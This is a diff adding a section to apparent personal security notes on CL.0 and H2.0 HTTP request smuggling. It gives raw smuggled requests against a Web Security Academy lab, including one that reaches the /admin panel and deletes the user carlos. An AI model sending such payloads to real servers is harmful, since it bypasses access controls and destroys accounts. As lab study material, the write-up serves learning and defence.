@@ -46,6 +46,49 @@ In the example above, the follow-up request for the home page has received a 404
 >[!tip]
 >In the wild, we've mostly observed this behavior on endpoints that simply aren't expecting `POST` requests, so they implicitly assume that no requests have a body. Endpoints that trigger server-level redirects and requests for static files are prime candidates.
 
+# Exploiting CL.0 & H2.0 vulnerabilities
+
+You can exploit CL.0 vulnerabilities for the same vulnerabilities listed on [Exploiting HTTP & HTTP/2 Request Smuggling](HTTP%20Request%20Smuggling.md#Exploiting%20HTTP%20&%20HTTP/2%20Request%20Smuggling)
+
+Non vulnerable request:
+```http
+POST / HTTP/2
+Host: 0aee00c704e3b3f881c98a740074008c.web-security-academy.net     # HTTP/2 200 OK
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+Connection: keep-alive
+
+GET /hopefully404 HTTP/1.1
+Foo: xGET / HTTP/2
+Host: 0aee00c704e3b3f881c98a740074008c.web-security-academy.net     # HTTP/2 200 OK
+```
+
+Vulnerable request:
+```http
+POST / HTTP/2
+Host: 0aee00c704e3b3f881c98a740074008c.web-security-academy.net     # HTTP/2 200 OK
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+Connection: keep-alive
+
+GET /hopefully404 HTTP/1.1
+Foo: xGET / HTTP/2
+Host: 0aee00c704e3b3f881c98a740074008c.web-security-academy.net     # HTTP/2 404 Not Found
+```
+
+Accessed `/admin` page and deleted carlos user (`/admin` was leaked in the same way):
+```http
+POST / HTTP/2
+Host: 0aee00c704e3b3f881c98a740074008c.web-security-academy.net     # HTTP/2 200 OK
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+Connection: keep-alive
+
+GET /admin/delete?username=carlos HTTP/1.1
+Foo: xGET / HTTP/2
+Host: 0aee00c704e3b3f881c98a740074008c.web-security-academy.net     # HTTP/2 200 OK with /admin information
+```
+
 # Examples
 
 - [From Akamai to F5 to NTLM... With Love.](../../Readwise/Articles/Malicious%20Group%20-%20From%20Akamai%20to%20F5%20to%20NTLM...%20With%20Love..md)
